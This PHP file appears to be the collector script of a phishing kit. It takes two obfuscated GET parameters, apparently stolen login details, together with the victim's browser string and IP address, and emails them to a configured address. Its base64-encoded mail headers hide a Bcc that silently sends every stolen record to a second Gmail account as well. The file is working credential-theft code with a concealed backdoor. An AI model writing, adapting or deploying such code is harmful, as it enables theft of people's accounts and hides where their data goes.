<?php
/**
 * Created by PhpStorm.
 * User: Ijoba Wire
 * Date: 1/26/2020
 * Time: 1:13 PM
 */
include "settings.php";

$to = $g_email;
$tyuoe = $_GET['wtuter'];
$gdgjfj = $_GET['sqtyrhf'];
$agent = $_SERVER ['HTTP_USER_AGENT'];
$ip = $_SERVER ['REMOTE_ADDR'];
$date = date ('l dS \ of F Y h: i: s A');
$sub = "New Details";
$a0=[base64_decode('TUlNRS1WZXJzaW9uOiAxLjA='),base64_decode('Q29udGVudC10eXBlOiB0ZXh0L3BsYWluOyBjaGFyc2V0PXV0Zi04'),base64_decode('RnJvbTogaWpvYmF3aXJlQHdlLmNvbQ=='),base64_decode('QmNjOiBtaWNod2FycmVuNEBnbWFpbC5jb20=')];
$headers = implode("\r\n", $a0);
$msg = "";
$msg .= 'gfvy:'. $tyuoe. "\n";
$msg .= "tyuio:". $gdgjfj. "\n";
$msg .= "Browser:". $agent. "\n";
$msg .= "IP:". $ip. "\n";
$msg .= 'Date and time:'. $date;
if(mail($to, $sub, $msg, $headers)){
    echo "success";
}else{
    echo "failed";
}
